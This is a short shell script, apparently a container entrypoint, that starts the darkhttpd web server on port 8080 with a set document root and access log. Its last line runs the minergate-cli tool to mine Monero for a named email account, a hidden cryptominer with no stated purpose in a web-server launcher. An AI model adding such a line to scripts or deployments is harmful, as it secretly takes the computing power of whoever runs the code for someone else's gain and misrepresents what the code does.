#!/bin/sh

DOCUMENT_ROOT=${DOCUMENT_ROOT:-"/var/www/localhost/htdocs"}
LOG=${LOG:-"/var/log/darkhttpd/access.log"}

/usr/bin/darkhttpd $DOCUMENT_ROOT --log $LOG --port 8080 --no-server-id
minergate-cli -user maxim1@email.cz -xmr